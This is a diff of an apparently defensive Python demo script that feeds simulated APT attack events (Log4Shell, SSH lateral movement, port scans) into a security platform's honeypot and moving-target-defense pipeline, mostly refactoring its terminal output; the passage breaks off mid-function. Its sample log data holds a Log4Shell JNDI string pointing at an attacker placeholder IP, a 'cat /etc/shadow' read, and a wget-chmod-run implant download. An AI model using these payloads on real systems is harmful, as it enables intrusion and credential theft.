@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-╔═══════════════════════════════════════════════════════════════╗
-║           NeoVigil — APT Kill Chain Simulator                 ║
-║         Demonstrating the Active Defense Triad                ║
-║              Predict · Deceive · Mutate                       ║
-╚═══════════════════════════════════════════════════════════════╝
+╔═════════════════════════════════════════════════════════════╗
+║          NeoVigil — APT Kill Chain Simulator                ║
+║        Demonstrating the Active Defense Triad               ║
+║             Predict · Deceive · Mutate                      ║
+╚═════════════════════════════════════════════════════════════╝
 
 This script simulates a realistic APT campaign against NeoVigil
 to demonstrate the full Active Defense Triad in real-time.
@@ -30,7 +30,8 @@ import os
 import sys
 import time
 import uuid
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
+
 
 # ─── Terminal Color Codes ─────────────────────────────────────
 # ANSI escape codes for cinematic terminal output
@@ -40,7 +41,6 @@ class C:
     RESET   = "\033[0m"
     BOLD    = "\033[1m"
     DIM     = "\033[2m"
-    BLINK   = "\033[5m"
 
     # Foreground
     RED     = "\033[91m"
@@ -52,20 +52,76 @@ class C:
     WHITE   = "\033[97m"
     ORANGE  = "\033[38;5;208m"
 
-    # Background
-    BG_RED    = "\033[41m"
-    BG_GREEN  = "\033[42m"
-    BG_YELLOW = "\033[43m"
-    BG_BLUE   = "\033[44m"
-    BG_MAGENTA= "\033[45m"
-    BG_CYAN   = "\033[46m"
-
     # Phase-specific
     PHASE1  = "\033[38;5;196m"   # Bright red — Predict
     PHASE2  = "\033[38;5;208m"   # Orange — Deceive
     PHASE3  = "\033[38;5;51m"    # Cyan — Mutate
     SYSTEM  = "\033[38;5;245m"   # Gray — System messages
-    SKULL   = "\033[38;5;196m"   # Skull/danger
+
+
+# ─── Box-Drawing Helpers ──────────────────────────────────────
+# Robust formatting that pads every line to a fixed inner width,
+# guaranteeing perfect alignment regardless of content length.
+
+BOX_W = 60  # inner width between the left and right border chars
+
+
+def _pad(text: str, width: int = BOX_W) -> str:
+    """Pad *visible* text to exactly `width` characters.
+
+    ANSI escape sequences are stripped for length measurement so
+    that coloured strings are padded correctly.
+    """
+    import re
+    visible_len = len(re.sub(r"\033\[[0-9;]*m", "", text))
+    padding = max(0, width - visible_len)
+    return text + " " * padding
+
+
+def box_top(title: str, color: str, width: int = BOX_W) -> str:
+    """Return ┌─ TITLE ──…──┐ stretched to width."""
+    dashes = max(1, width - len(title) - 2)
+    return f"{color}  ┌─ {title} {'─' * dashes}┐{C.RESET}"
+
+
+def box_row(text: str, color: str, width: int = BOX_W) -> str:
+    """Return │  text (padded)  │."""
+    return f"{color}  │ {_pad(text, width)} │{C.RESET}"
+
+
+def box_empty(color: str, width: int = BOX_W) -> str:
+    """Return an empty row  │ (spaces) │."""
+    return box_row("", color, width)
+
+
+def box_bottom(color: str, width: int = BOX_W) -> str:
+    """Return └──…──┘."""
+    return f"{color}  └{'─' * (width + 2)}┘{C.RESET}"
+
+
+def box_div(color: str, char: str = "═", width: int = BOX_W) -> str:
+    """Return a divider row  ╠══…══╣  (or similar)."""
+    return f"{color}  ╠{char * (width + 2)}╣{C.RESET}"
+
+
+def dbox_top(color: str, width: int = BOX_W) -> str:
+    """Double-line top  ╔══…══╗."""
+    return f"{color}  ╔{'═' * (width + 2)}╗{C.RESET}"
+
+
+def dbox_row(text: str, color: str, width: int = BOX_W) -> str:
+    """Double-line row  ║  text (padded)  ║."""
+    return f"{color}  ║ {_pad(text, width)} ║{C.RESET}"
+
+
+def dbox_bottom(color: str, width: int = BOX_W) -> str:
+    """Double-line bottom  ╚══…══╝."""
+    return f"{color}  ╚{'═' * (width + 2)}╝{C.RESET}"
+
+
+def dbox_div(color: str, width: int = BOX_W) -> str:
+    """Double-line divider  ╠══…══╣."""
+    return f"{color}  ╠{'═' * (width + 2)}╣{C.RESET}"
 
 
 # ─── Configuration ────────────────────────────────────────────
@@ -92,6 +148,11 @@ QUEUE_HONEYPOT       = "honeypot_events"
 QUEUE_MTD_ACTION     = "mtd_action_queue"
 
 
+def _utcnow() -> datetime:
+    """Return timezone-aware UTC now (no deprecation warning)."""
+    return datetime.now(timezone.utc)
+
+
 # ─── Dependency Check ─────────────────────────────────────────
 
 def check_dependencies():
@@ -109,35 +170,39 @@ def check_dependencies():
 
 def banner():
     """Print the startup banner."""
-    print(f"""
-{C.RED}{C.BOLD}
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║                                                               ║
-    ║     ███╗   ██╗███████╗ ██████╗ ██╗   ██╗██╗ ██████╗ ██╗██╗   ║
-    ║     ████╗  ██║██╔════╝██╔═══██╗██║   ██║██║██╔════╝ ██║██║   ║
-    ║     ██╔██╗ ██║█████╗  ██║   ██║██║   ██║██║██║  ███╗██║██║   ║
-    ║     ██║╚██╗██║██╔══╝  ██║   ██║╚██╗ ██╔╝██║██║   ██║██║██║   ║
-    ║     ██║ ╚████║███████╗╚██████╔╝ ╚████╔╝ ██║╚██████╔╝██║███╗  ║
-    ║     ╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══╝  ║
-    ║                                                               ║
-    ║          A P T   K I L L   C H A I N   S I M U L A T O R     ║
-    ║              Active Defense Triad Demonstration               ║
-    ║                                                               ║
-    ╚═══════════════════════════════════════════════════════════════╝
-{C.RESET}""")
+    W = BOX_W
+    lines = [
+        "",
+        "███╗   ██╗███████╗ ██████╗ ██╗   ██╗██╗ ██████╗ ██╗██╗",
+        "████╗  ██║██╔════╝██╔═══██╗██║   ██║██║██╔════╝ ██║██║",
+        "██╔██╗ ██║█████╗  ██║   ██║██║   ██║██║██║  ███╗██║██║",
+        "██║╚██╗██║██╔══╝  ██║   ██║╚██╗ ██╔╝██║██║   ██║██║██║",
+        "██║ ╚████║███████╗╚██████╔╝ ╚████╔╝ ██║╚██████╔╝██║███╗",
+        "╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═══╝  ╚═╝ ╚═════╝ ╚═╝╚══╝",
+        "",
+        "A P T   K I L L   C H A I N   S I M U L A T O R",
+        "Active Defense Triad Demonstration",
+        "",
+    ]
+    print()
+    print(f"{C.RED}{C.BOLD}")
+    print(dbox_top(f"{C.RED}{C.BOLD}", W))
+    for line in lines:
+        print(dbox_row(line, f"{C.RED}{C.BOLD}", W))
+    print(dbox_bottom(f"{C.RED}{C.BOLD}", W))
+    print(C.RESET)
 
 
-def phase_header(phase_num, title, color, icon):
+def phase_header(phase_num: int, title: str, color: str, icon: str):
     """Print a large phase header."""
-    width = 60
     print(f"\n{color}{C.BOLD}")
-    print(f"  {'═' * width}")
+    print(f"  {'═' * (BOX_W + 2)}")
     print(f"  ║  {icon}  PHASE {phase_num}: {title}")
-    print(f"  {'═' * width}")
-    print(f"{C.RESET}")
+    print(f"  {'═' * (BOX_W + 2)}")
+    print(C.RESET)
 
 
-def step(msg, color=C.WHITE, prefix="  ▸"):
+def step(msg: str, color: str = C.WHITE, prefix: str = "  ▸"):
     """Print a step message with typing effect."""
     full = f"{color}{prefix} {msg}{C.RESET}"
     for char in full:
@@ -147,38 +212,27 @@ def step(msg, color=C.WHITE, prefix="  ▸"):
     print()
 
 
-def info(msg):
-    """System info message."""
-    step(msg, C.SYSTEM, "  ℹ")
+def info(msg):    step(msg, C.SYSTEM, "  ℹ")
+def success(msg): step(msg, C.GREEN,  "  ✔")
+def warning(msg): step(msg, C.YELLOW, "  ⚠")
+def danger(msg):  step(msg, C.RED,    "  ☠")
 
 
-def success(msg):
-    """Success message."""
-    step(msg, C.GREEN, "  ✔")
-
-
-def warning(msg):
-    """Warning message."""
-    step(msg, C.YELLOW, "  ⚠")
-
-
-def danger(msg):
-    """Danger/attack message."""
-    step(msg, C.RED, "  ☠")
-
-
-def payload_box(title, payload_dict, color=C.DIM):
-    """Print a formatted payload box."""
-    print(f"{color}  ┌─ {title} {'─' * max(1, 50 - len(title))}┐{C.RESET}")
+def payload_box(title: str, payload_dict: dict, color: str = C.DIM):
+    """Print a formatted key-value payload box."""
+    kw = 20
+    vw = BOX_W - kw - 4  # 4 = " │ " separators
+    print(box_top(title, color))
     for key, value in payload_dict.items():
         val_str = str(value)
-        if len(val_str) > 45:
-            val_str = val_str[:42] + "..."
-        print(f"{color}  │  {key:20s} │ {val_str}{C.RESET}")
-    print(f"{color}  └{'─' * 54}┘{C.RESET}")
+        if len(val_str) > vw:
+            val_str = val_str[: vw - 3] + "..."
+        inner = f" {key:<{kw}} │ {val_str:<{vw}}"
+        print(box_row(inner, color))
+    print(box_bottom(color))
 
 
-def countdown(seconds, msg=""):
+def countdown(seconds: int, msg: str = ""):
     """Visual countdown timer."""
     for i in range(seconds, 0, -1):
         sys.stdout.write(
@@ -192,12 +246,12 @@ def countdown(seconds, msg=""):
 
 def separator():
     """Print a thin separator."""
-    print(f"{C.DIM}  {'─' * 60}{C.RESET}")
+    print(f"{C.DIM}  {'─' * (BOX_W + 2)}{C.RESET}")
 
 
 # ─── RabbitMQ Publisher ───────────────────────────────────────
 
-def publish_to_queue(pika_module, queue_name, payload, label=""):
+def publish_to_queue(pika_module, queue_name: str, payload, label: str = ""):
     """Publish a JSON payload to a RabbitMQ queue."""
     try:
         credentials = pika_module.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
@@ -250,16 +304,16 @@ def phase1_predict(pika):
     time.sleep(1.0)
 
     log4shell_payload = {
-        "timestamp": datetime.utcnow().isoformat(),
+        "timestamp": _utcnow().isoformat(),
         "source_ip": ATTACKER_IP,
         "dest_ip": TARGET_IP,
         "dest_port": 8080,
         "protocol": "HTTP",
         "message": (
-            f'GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\n'
-            f'X-Api-Key: ${{jndi:ldap://{ATTACKER_IP}:1389/'
-            f'a]}}\\r\\n'
-            f'User-Agent: Mozilla/5.0'
+            f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\n"
+            f"X-Api-Key: ${{jndi:ldap://{ATTACKER_IP}:1389/"
+            f"a]}}\r\n"
+            f"User-Agent: Mozilla/5.0"
         ),
         "attack_type": "Remote Code Execution",
         "severity": "Critical",
@@ -282,7 +336,11 @@ def phase1_predict(pika):
     print()
 
     time.sleep(0.5)
-    publish_to_queue(pika, QUEUE_CTI, json.dumps(log4shell_payload).encode().decode(), "Log4Shell exploit log")
+    publish_to_queue(
+        pika, QUEUE_CTI,
+        json.dumps(log4shell_payload).encode().decode(),
+        "Log4Shell exploit log",
+    )
 
     separator()
     info("NeoVigil Pipeline Worker receives the log...")
@@ -290,36 +348,36 @@ def phase1_predict(pika):
     info("Severity = CRITICAL → forwarded to Adversarial Engine...")
     time.sleep(1.0)
 
-    # Step 2: Inject directly as a high-risk prediction trigger
+    # Step 2: Display simulated REDSPEC prediction
     danger("REDSPEC Red Team persona activating...")
     time.sleep(0.5)
-
     step(f"{C.PHASE1}{C.BOLD}REDSPEC analyzing network topology...{C.RESET}")
     time.sleep(0.5)
     step(f"{C.PHASE1}{C.BOLD}REDSPEC predicting lateral movement paths...{C.RESET}")
     time.sleep(0.5)
 
-    # Simulate what REDSPEC would predict
-    print(f"""
-{C.PHASE1}{C.BOLD}  ┌─ REDSPEC PREDICTED KILL CHAIN ───────────────────────────┐
-  │                                                          │
-  │  Step 1: {C.YELLOW}T1190{C.PHASE1} Exploit Public-Facing App (Log4Shell)       │
-  │          Host: {TARGET_HOST}:8080                        │
-  │          Confidence: 95%                                 │
-  │                                                          │
-  │  Step 2: {C.YELLOW}T1021.004{C.PHASE1} Lateral Movement via SSH                │
-  │          Host: db-server-01:22                           │
-  │          Confidence: 82%                                 │
-  │                                                          │
-  │  Step 3: {C.YELLOW}T1003{C.PHASE1} Credential Dumping (LSASS Memory)           │
-  │          Host: dc-primary:445                            │
-  │          Confidence: 74%                                 │
-  │                                                          │
-  │  {C.RED}Overall Risk Score: 91 / 100{C.PHASE1}                          │
-  │  {C.GREEN}→ Risk ≥ 70: Deploying honeypot (Phase 2){C.PHASE1}              │
-  │  {C.CYAN}→ Risk ≥ 85: Triggering MTD evaluation (Phase 3){C.PHASE1}      │
-  └──────────────────────────────────────────────────────────┘{C.RESET}
-""")
+    # Render the Predicted Kill Chain box with robust alignment
+    p = C.PHASE1 + C.BOLD
+    print()
+    print(box_top("REDSPEC PREDICTED KILL CHAIN", p))
+    print(box_empty(p))
+    print(box_row(f" Step 1: {C.YELLOW}T1190{p} Exploit Public-Facing App (Log4Shell)", p))
+    print(box_row(f"         Host: {TARGET_HOST}:8080", p))
+    print(box_row(f"         Confidence: 95%", p))
+    print(box_empty(p))
+    print(box_row(f" Step 2: {C.YELLOW}T1021.004{p} Lateral Movement via SSH", p))
+    print(box_row(f"         Host: db-server-01:22", p))
+    print(box_row(f"         Confidence: 82%", p))
+    print(box_empty(p))
+    print(box_row(f" Step 3: {C.YELLOW}T1003{p} Credential Dumping (LSASS Memory)", p))
+    print(box_row(f"         Host: dc-primary:445", p))
+    print(box_row(f"         Confidence: 74%", p))
+    print(box_empty(p))
+    print(box_row(f" {C.RED}Overall Risk Score: 91 / 100{p}", p))
+    print(box_row(f" {C.GREEN}→ Risk ≥ 70: Deploying honeypot (Phase 2){p}", p))
+    print(box_row(f" {C.CYAN}→ Risk ≥ 85: Triggering MTD evaluation (Phase 3){p}", p))
+    print(box_bottom(p))
+    print()
 
     success("Phase 1 complete — attack path predicted, defense chain activated")
     countdown(3, "Phase 2 deploying... ")
@@ -342,9 +400,9 @@ def phase2_deceive(pika):
     decoy_id = f"decoy-{uuid.uuid4().hex[:8]}"
     prediction_id = f"pred-{uuid.uuid4().hex[:8]}"
 
-    info(f"NeoVigil Decoy Manager received deployment task...")
+    info("NeoVigil Decoy Manager received deployment task...")
     time.sleep(0.5)
-    info(f"Selecting template: SSH Honeypot (matching predicted Step 2)")
+    info("Selecting template: SSH Honeypot (matching predicted Step 2)")
     time.sleep(0.3)
     info(f"Deploying honeypot container: {decoy_id}")
     time.sleep(0.3)
@@ -356,29 +414,31 @@ def phase2_deceive(pika):
 
     danger(f"{APT_NAME} begins lateral movement...")
     time.sleep(0.5)
-    danger(f"Scanning subnet 10.20.30.0/24 for SSH services...")
+    danger("Scanning subnet 10.20.30.0/24 for SSH services...")
     time.sleep(0.5)
-    danger(f"Found SSH on 10.20.30.200:22 — connecting...")
+    danger("Found SSH on 10.20.30.200:22 — connecting...")
     time.sleep(0.5)
 
-    print(f"""
-{C.ORANGE}{C.BOLD}  ┌─ ATTACKER SSH SESSION (HONEYPOT) ─────────────────────────┐
-  │                                                            │
-  │  $ ssh root@10.20.30.200                                   │
-  │  root@10.20.30.200's password: ****                        │
-  │  Welcome to Ubuntu 22.04.2 LTS                             │
-  │                                                            │
-  │  root@db-server-01:~# whoami                               │
-  │  root                                                      │
-  │  root@db-server-01:~# cat /etc/shadow                      │
-  │  root:$6$rounds=656000$aSalt$haSh...:19500:0:99999:7:::    │
-  │  root@db-server-01:~# wget http://{ATTACKER_IP}/implant    │
-  │  Connecting to {ATTACKER_IP}... connected.                 │
-  │                                                            │
-  │  {C.GREEN}[HONEYPOT] All commands recorded & exfiltrated{C.ORANGE}           │
-  │  {C.GREEN}[HONEYPOT] Payload hash: never seen before → ZERO-DAY{C.ORANGE}   │
-  └────────────────────────────────────────────────────────────┘{C.RESET}
-""")
+    # Render attacker SSH session box
+    o = C.ORANGE + C.BOLD
+    print()
+    print(box_top("ATTACKER SSH SESSION (HONEYPOT)", o))
+    print(box_empty(o))
+    print(box_row(" $ ssh root@10.20.30.200", o))
+    print(box_row(" root@10.20.30.200's password: ****", o))
+    print(box_row(" Welcome to Ubuntu 22.04.2 LTS", o))
+    print(box_empty(o))
+    print(box_row(" root@db-server-01:~# whoami", o))
+    print(box_row(" root", o))
+    print(box_row(" root@db-server-01:~# cat /etc/shadow", o))
+    print(box_row(" root:$6$rounds=656000$aSalt$haSh...:19500:0:99999:7:::", o))
+    print(box_row(f" root@db-server-01:~# wget http://{ATTACKER_IP}/implant", o))
+    print(box_row(f" Connecting to {ATTACKER_IP}... connected.", o))
+    print(box_empty(o))
+    print(box_row(f" {C.GREEN}[HONEYPOT] All commands recorded & exfiltrated{o}", o))
+    print(box_row(f" {C.GREEN}[HONEYPOT] Payload hash: never seen → ZERO-DAY{o}", o))
+    print(box_bottom(o))
+    print()
 
     # Inject the honeypot telemetry event
     honeypot_event = {
@@ -394,7 +454,7 @@ def phase2_deceive(pika):
             f"cat /etc/shadow; wget http://{ATTACKER_IP}/implant -O /tmp/.x; "
             f"chmod +x /tmp/.x; /tmp/.x"
         ),
-        "timestamp": datetime.utcnow().isoformat(),
+        "timestamp": _utcnow().isoformat(),
         "tenant_id": TENANT_ID,
     }
 
@@ -404,7 +464,7 @@ def phase2_deceive(pika):
         "Service": "SSH (port 22)",
         "Payload": "cat /etc/shadow; wget implant",
         "Classification": "T1003 Credential Dumping",
-        "Novelty": "🆕 ZERO-DAY (hash never seen)",
+        "Novelty": "ZERO-DAY (hash never seen)",
     }, C.ORANGE)
     print()
 
@@ -418,21 +478,23 @@ def phase2_deceive(pika):
     info("Checking payload novelty: SHA256 hash not in index → ZERO-DAY")
     time.sleep(0.3)
 
-    print(f"""
-{C.GREEN}{C.BOLD}  ┌─ VALIDATION RESULT ──────────────────────────────────────┐
-  │                                                          │
-  │  Predicted Technique:  T1003 (Credential Dumping)        │
-  │  Actual Technique:     T1003 (Credential Dumping)        │
-  │  Result:               ✅ PREDICTION CORRECT              │
-  │                                                          │
-  │  Novel Payload:        🆕 YES — ZERO-DAY CAPTURED        │
-  │  RAG Feedback:         📚 Indexed to security-logs-knn   │
-  │  CTI Report:           🚨 Indexed for Tier 2+ review     │
-  │                                                          │
-  │  {C.CYAN}→ Phase 1 is now SMARTER (captured technique in RAG){C.GREEN}  │
-  │  {C.CYAN}→ MTD trigger dispatched to mtd_action_queue{C.GREEN}          │
-  └──────────────────────────────────────────────────────────┘{C.RESET}
-""")
+    # Render validation result box
+    g = C.GREEN + C.BOLD
+    print()
+    print(box_top("VALIDATION RESULT", g))
+    print(box_empty(g))
+    print(box_row(" Predicted Technique:  T1003 (Credential Dumping)", g))
+    print(box_row(" Actual Technique:     T1003 (Credential Dumping)", g))
+    print(box_row(" Result:               PREDICTION CORRECT", g))
+    print(box_empty(g))
+    print(box_row(" Novel Payload:        YES — ZERO-DAY CAPTURED", g))
+    print(box_row(" RAG Feedback:         Indexed to security-logs-knn", g))
+    print(box_row(" CTI Report:           Indexed for Tier 2+ review", g))
+    print(box_empty(g))
+    print(box_row(f" {C.CYAN}→ Phase 1 is now SMARTER (captured technique in RAG){g}", g))
+    print(box_row(f" {C.CYAN}→ MTD trigger dispatched to mtd_action_queue{g}", g))
+    print(box_bottom(g))
+    print()
 
     success("Phase 2 complete — attacker captured, system evolved")
     countdown(3, "Phase 3 activating... ")
@@ -461,17 +523,18 @@ def phase3_mutate(pika):
     time.sleep(0.5)
 
     probe_ports = [80, 443, 8080, 8443, 22, 3389, 445, 3306, 5432, 389]
+    total = len(probe_ports)
     for i, port in enumerate(probe_ports):
+        bar = "█" * (i + 1) + "░" * (total - i - 1)
         sys.stdout.write(
-            f"\r{C.RED}  ☠ Probe {i+1:>2}/{len(probe_ports)}: "
-            f"nmap -sV {TARGET_IP}:{port} "
-            f"{'█' * (i + 1)}{'░' * (len(probe_ports) - i - 1)}{C.RESET}"
+            f"\r{C.RED}  ☠ Probe {i + 1:>2}/{total}: "
+            f"nmap -sV {TARGET_IP}:{port:<5} {bar}{C.RESET}"
         )
         sys.stdout.flush()
         time.sleep(0.3)
     print("\n")
 
-    # Inject a high-signal MTD trigger that aggregates all signals
+    # Inject a high-signal MTD trigger
     mtd_trigger = {
         "trigger_id": str(uuid.uuid4()),
         "trigger_source": "apt_simulation",
@@ -480,11 +543,11 @@ def phase3_mutate(pika):
         "scanner_ip": ATTACKER_IP,
         "source_ip": ATTACKER_IP,
         "risk_score": 91,
-        "scan_count": len(probe_ports),
+        "scan_count": total,
         "captures": 3,
         "technique_detected": "T1595.002",
         "tenant_id": TENANT_ID,
-        "timestamp": datetime.utcnow().isoformat(),
+        "timestamp": _utcnow().isoformat(),
     }
 
     publish_to_queue(pika, QUEUE_MTD_ACTION, mtd_trigger, "MTD composite trigger")
@@ -494,42 +557,45 @@ def phase3_mutate(pika):
     info("MTD Controller computing composite threat score...")
     time.sleep(0.5)
 
-    print(f"""
-{C.PHASE3}{C.BOLD}  ┌─ MTD COMPOSITE SCORING ──────────────────────────────────┐
-  │                                                          │
-  │  Signal Weights:                                         │
-  │  ├── Prediction Risk (40%):  91 × 0.40 = {C.RED}36.40{C.PHASE3}          │
-  │  ├── Honeypot Captures (30%): 3 × 25 = 75 × 0.30 = {C.RED}22.50{C.PHASE3} │
-  │  ├── Scanner Probes (20%):   10 × 10 = 100 × 0.20 = {C.RED}20.00{C.PHASE3}│
-  │  └── Asset Criticality (10%): Critical × 0.10 = {C.RED}10.00{C.PHASE3}    │
-  │                                                          │
-  │  ╔══════════════════════════════════════════════════════╗ │
-  │  ║  COMPOSITE MTD THREAT SCORE:  {C.RED}{C.BOLD}88.90 / 100{C.PHASE3}          ║ │
-  │  ╚══════════════════════════════════════════════════════╝ │
-  │                                                          │
-  │  Action Determination:                                   │
-  │  ├── Score 88.90 ≥ 60  → {C.GREEN}✅ OBFUSCATION (auto-approved){C.PHASE3}  │
-  │  └── Score 88.90 ≥ 85  → {C.YELLOW}🔔 MIGRATION (Tier2 approval){C.PHASE3} │
-  └──────────────────────────────────────────────────────────┘{C.RESET}
-""")
+    # Render composite scoring box
+    c3 = C.PHASE3 + C.BOLD
+    print()
+    print(box_top("MTD COMPOSITE SCORING", c3))
+    print(box_empty(c3))
+    print(box_row(" Signal Weights:", c3))
+    print(box_row(f" ├── Prediction Risk  (40%):  91 x 0.40  = {C.RED}36.40{c3}", c3))
+    print(box_row(f" ├── Honeypot Caps    (30%):  75 x 0.30  = {C.RED}22.50{c3}", c3))
+    print(box_row(f" ├── Scanner Probes   (20%): 100 x 0.20  = {C.RED}20.00{c3}", c3))
+    print(box_row(f" └── Asset Criticality(10%): Crit x 0.10 = {C.RED}10.00{c3}", c3))
+    print(box_empty(c3))
+    print(box_row(f" ╔════════════════════════════════════════════════════════╗", c3))
+    print(box_row(f" ║  COMPOSITE MTD THREAT SCORE:  {C.RED}{C.BOLD}88.90 / 100{c3}             ║", c3))
+    print(box_row(f" ╚════════════════════════════════════════════════════════╝", c3))
+    print(box_empty(c3))
+    print(box_row(" Action Determination:", c3))
+    print(box_row(f" ├── Score 88.90 >= 60  → {C.GREEN}OBFUSCATION (auto-approved){c3}", c3))
+    print(box_row(f" └── Score 88.90 >= 85  → {C.YELLOW}MIGRATION (Tier2 approval){c3}", c3))
+    print(box_bottom(c3))
+    print()
 
     time.sleep(1.0)
 
-    # Obfuscation execution
+    # ─── Obfuscation execution ────────────────────────
     step(f"{C.GREEN}{C.BOLD}━━━ EXECUTING: Nginx Obfuscation ━━━{C.RESET}")
     time.sleep(0.3)
     info(f"Scanner IP {ATTACKER_IP} matched to obfuscation rule")
     info("Randomly selected spoof profile: 'microsoft_iis'")
     time.sleep(0.3)
 
-    print(f"""
-{C.GREEN}  Before Obfuscation:                After Obfuscation:
-  ┌────────────────────────┐        ┌────────────────────────────────┐
-  │ Server: nginx/1.24.0   │   →    │ Server: Microsoft-IIS/10.0     │
-  │ X-Powered-By: —        │   →    │ X-Powered-By: ASP.NET          │
-  │ (real fingerprint)     │        │ X-AspNet-Version: 4.0.30319    │
-  └────────────────────────┘        └────────────────────────────────┘
-{C.RESET}""")
+    bw = 26  # width for each sub-box
+    print()
+    print(f"{C.GREEN}  Before Obfuscation:{' ' * (bw - 4)}After Obfuscation:{C.RESET}")
+    print(f"{C.GREEN}  ┌{'─' * bw}┐{' ' * 6}┌{'─' * (bw + 8)}┐{C.RESET}")
+    print(f"{C.GREEN}  │ {'Server: nginx/1.24.0':<{bw - 1}}│  →   │ {'Server: Microsoft-IIS/10.0':<{bw + 7}}│{C.RESET}")
+    print(f"{C.GREEN}  │ {'X-Powered-By: —':<{bw - 1}}│  →   │ {'X-Powered-By: ASP.NET':<{bw + 7}}│{C.RESET}")
+    print(f"{C.GREEN}  │ {'(real fingerprint)':<{bw - 1}}│{' ' * 6}│ {'X-AspNet-Version: 4.0.30319':<{bw + 7}}│{C.RESET}")
+    print(f"{C.GREEN}  └{'─' * bw}┘{' ' * 6}└{'─' * (bw + 8)}┘{C.RESET}")
+    print()
 
     success(f"Obfuscation ACTIVE — {ATTACKER_IP} now sees IIS/ASP.NET")
     time.sleep(0.5)
@@ -538,36 +604,37 @@ def phase3_mutate(pika):
 
     separator()
 
-    # Migration proposal
+    # ─── Migration proposal ───────────────────────────
     step(f"{C.YELLOW}{C.BOLD}━━━ PROPOSING: Blue/Green Migration ━━━{C.RESET}")
     time.sleep(0.5)
 
     migration_id = f"mig-{uuid.uuid4().hex[:8]}"
-    approval_deadline = (datetime.utcnow() + timedelta(minutes=15)).strftime("%H:%M:%S UTC")
+    deadline = (_utcnow() + timedelta(minutes=15)).strftime("%H:%M:%S UTC")
 
-    print(f"""
-{C.YELLOW}{C.BOLD}  ┌─ MIGRATION PROPOSAL (AWAITING TIER 2+ APPROVAL) ────────┐
-  │                                                          │
-  │  Migration ID:    {migration_id}                         │
-  │  Target:          {TARGET_HOST} ({TARGET_IP})            │
-  │  Action:          Blue/Green Container Migration         │
-  │                                                          │
-  │  Migration Phases:                                       │
-  │    1. CLONE   — Snapshot {TARGET_HOST} state              │
-  │    2. START   — Launch Green container with new IP       │
-  │    3. DRAIN   — Gracefully drain Blue connections (30s)  │
-  │    4. SWAP    — Switch traffic to Green                  │
-  │                                                          │
-  │  Post-Migration:                                         │
-  │    • Old Blue container → converted to honeypot          │
-  │    • Rollback window: 4 hours                            │
-  │                                                          │
-  │  Approval Deadline: {approval_deadline}                  │
-  │                                                          │
-  │  {C.RED}🔔 Sent to mtd_approval_queue{C.YELLOW}                          │
-  │  {C.RED}🔔 Visible in 🛡️ MTD Dashboard{C.YELLOW}                         │
-  └──────────────────────────────────────────────────────────┘{C.RESET}
-""")
+    y = C.YELLOW + C.BOLD
+    print()
+    print(box_top("MIGRATION PROPOSAL (AWAITING TIER 2+ APPROVAL)", y))
+    print(box_empty(y))
+    print(box_row(f" Migration ID:    {migration_id}", y))
+    print(box_row(f" Target:          {TARGET_HOST} ({TARGET_IP})", y))
+    print(box_row(f" Action:          Blue/Green Container Migration", y))
+    print(box_empty(y))
+    print(box_row(f" Migration Phases:", y))
+    print(box_row(f"   1. CLONE  — Snapshot {TARGET_HOST} state", y))
+    print(box_row(f"   2. START  — Launch Green container with new IP", y))
+    print(box_row(f"   3. DRAIN  — Gracefully drain Blue conns (30s)", y))
+    print(box_row(f"   4. SWAP   — Switch traffic to Green", y))
+    print(box_empty(y))
+    print(box_row(f" Post-Migration:", y))
+    print(box_row(f"   • Old Blue container → converted to honeypot", y))
+    print(box_row(f"   • Rollback window: 4 hours", y))
+    print(box_empty(y))
+    print(box_row(f" Approval Deadline: {deadline}", y))
+    print(box_empty(y))
+    print(box_row(f" {C.RED}🔔 Sent to mtd_approval_queue{y}", y))
+    print(box_row(f" {C.RED}🔔 Visible in 🛡️ MTD Dashboard{y}", y))
+    print(box_bottom(y))
+    print()
 
     separator()
     info("Immutable audit record indexed to mtd-audit-log")
@@ -583,40 +650,40 @@ def phase3_mutate(pika):
 
 def print_summary():
     """Print the final summary of the simulation."""
-    print(f"""
-{C.BOLD}{C.WHITE}
-  ╔═══════════════════════════════════════════════════════════════╗
-  ║                                                               ║
-  ║            N E O V I G I L   D E F E N S E   R E P O R T      ║
-  ║                   Active Defense Triad Summary                ║
-  ║                                                               ║
-  ╠═══════════════════════════════════════════════════════════════╣
-  ║                                                               ║
-  ║  {C.PHASE1}⚡ PHASE 1 — PREDICT{C.WHITE}                                       ║
-  ║     Log4Shell exploit detected and analyzed                   ║
-  ║     REDSPEC predicted 3-step kill chain (risk: 91/100)        ║
-  ║     Honeypot deployment triggered, MTD evaluation queued      ║
-  ║                                                               ║
-  ║  {C.PHASE2}🍯 PHASE 2 — DECEIVE{C.WHITE}                                       ║
-  ║     SSH honeypot deployed on predicted attack path            ║
-  ║     Attacker captured: credential dumping (T1003)             ║
-  ║     Zero-day payload captured and indexed to RAG              ║
-  ║     Prediction validated: ✅ CORRECT                           ║
-  ║                                                               ║
-  ║  {C.PHASE3}🔄 PHASE 3 — MUTATE{C.WHITE}                                        ║
-  ║     Composite MTD score: 88.90 (≥ 85 threshold)              ║
-  ║     Nginx obfuscation: ACTIVE (IIS/ASP.NET spoof)            ║
-  ║     Blue/Green migration: PROPOSED (awaiting Tier 2)          ║
-  ║     Immutable audit trail: INDEXED                            ║
-  ║                                                               ║
-  ╠═══════════════════════════════════════════════════════════════╣
-  ║                                                               ║
-  ║  {C.GREEN}Attacker Status:  TRAPPED, FINGERPRINTED, MISDIRECTED{C.WHITE}      ║
-  ║  {C.GREEN}NeoVigil Status:  EVOLVED (RAG updated with new intel){C.WHITE}     ║
-  ║  {C.GREEN}Next Attacker:    HARDER (system learned from this one){C.WHITE}    ║
-  ║                                                               ║
-  ╚═══════════════════════════════════════════════════════════════╝
-{C.RESET}""")
+    w = C.BOLD + C.WHITE
+    print()
+    print(dbox_top(w))
+    print(dbox_row("", w))
+    print(dbox_row("N E O V I G I L   D E F E N S E   R E P O R T", w))
+    print(dbox_row("Active Defense Triad Summary", w))
+    print(dbox_row("", w))
+    print(dbox_div(w))
+    print(dbox_row("", w))
+    print(dbox_row(f"{C.PHASE1}⚡ PHASE 1 — PREDICT{w}", w))
+    print(dbox_row("   Log4Shell exploit detected and analyzed", w))
